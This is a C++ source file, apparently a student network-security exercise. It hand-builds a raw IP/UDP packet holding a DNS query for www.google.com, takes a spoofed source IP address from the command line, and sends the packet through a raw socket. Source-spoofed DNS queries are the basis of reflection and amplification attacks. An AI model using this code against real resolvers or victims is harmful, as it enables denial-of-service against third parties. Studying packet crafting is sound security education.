#include <iostream>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/udp.h>
#include <linux/ip.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <cstring>

#define DES_PORT 53

using namespace std;

struct dns_payload {
	__u16 id;
	__u16 flag;
	__u16 ques_c;
	__u16 ans_c;
	__u16 ah_count;
	__u16 rec_count;
};

unsigned short chksum(unsigned short* buff, int _16bitword) {
	unsigned long sum;
	for(sum=0; _16bitword>0; _16bitword--)
		sum+=htons(*(buff)++);
	sum = ((sum >> 16) + (sum & 0xFFFF));
	sum += (sum>>16);
	return (unsigned short)(~sum);
}

int main(int argc, char* const argv[]) {

    int sd, tot_len = 0;
    unsigned char buffer[64];						// assume all requires 64 bytes
    struct iphdr *iph = (struct iphdr *) buffer;	// iph point to the first part of buffer
    struct udphdr *udph = (struct udphdr *) (buffer + sizeof(struct iphdr));	// plus the size of iphdr
	struct dns_payload *payload = (struct dns_payload *) (buffer + sizeof(struct iphdr) + sizeof(struct udphdr));
	unsigned char *query = buffer;
	struct sockaddr_in addr;

	memset(buffer, 0, 64);

    // fill ip header
    iph->version = 4;
    iph->tos = 16;						// what is this?
    iph->ihl = 5;                       // Internet Header Length (IHL), which is the number of 32-bit words in the header
    iph->id = htons(6016);                   // id of this packet
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = 17;						// udp
    iph->check = 0;
    iph->saddr = inet_addr(argv[1]);         // ip spoof
    iph->daddr = inet_addr(argv[3]);
    // iph->tot_len =
    // iph->check  re-compute
	tot_len += sizeof(struct iphdr);



    udph->source = htons(atoi(argv[2]));
    udph->dest = htons(DES_PORT);                 // not sure
    udph->check = 0;
    //udph->len =
	tot_len += sizeof(struct udphdr);

	
	// dns query in udp payload
	//buffer[tot_len++] = htons(1234);			// QUERY ID, 
	//buffer[tot_len++] = 
	payload->id = 0xB0DF;						// last 2 bytes of sID 0516016
	payload->flag = 0;
	payload->ques_c = htons(1);
	payload->ans_c = 0;
	payload->ah_count = 0;
	payload->rec_count = 0;
	tot_len += sizeof(struct dns_payload);

	buffer[tot_len++] = 3;
	buffer[tot_len++] = 'w';
	buffer[tot_len++] = 'w';
	buffer[tot_len++] = 'w';
	buffer[tot_len++] = 6;
	buffer[tot_len++] = 'g';
	buffer[tot_len++] = 'o';
	buffer[tot_len++] = 'o';
	buffer[tot_len++] = 'g';
	buffer[tot_len++] = 'l';
	buffer[tot_len++] = 'e';
	buffer[tot_len++] = 3;
	buffer[tot_len++] = 'c';
	buffer[tot_len++] = 'o';
	buffer[tot_len++] = 'm';
	buffer[tot_len++] = 0;

	buffer[tot_len++] = 0;
	buffer[tot_len++] = 1;
	
	buffer[tot_len++] = 0;
	buffer[tot_len++] = 1;


	// tot_len and chksum
	iph->tot_len = htons(tot_len);
	udph->len = htons(tot_len - sizeof(struct iphdr));

	iph->check = chksum((unsigned short*)buffer, sizeof(struct iphdr) / 2);

	cout << "size of ip header: " << sizeof(struct iphdr) << endl;
	cout << "size of udp header: " << sizeof(struct udphdr) << endl;
	cout << "size of dns_payload: " << sizeof(struct dns_payload) << endl;
	cout << "tot_len: " << tot_len << endl;

	for(int i = 0; i < 64; ++i) {
		printf("%x ", buffer[i]);
	}
	cout << endl;
	

    // create a socket
    if((sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
        perror("error when create socket");
        exit(0);
    }

	int one = 1;
	const int *val = &one;
	if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
    	perror("setsockopt() error");
    	exit(0);
 	}


	// sockaddr
	addr.sin_family = AF_INET; 
    addr.sin_addr.s_addr = inet_addr(argv[3]);
    addr.sin_port = htons(DES_PORT); 


	if((sendto(sd, buffer, tot_len, 0, (struct sockaddr*) &addr, sizeof(addr))) < 0) {
        perror("error when sendto");
        exit(0);
	}

}
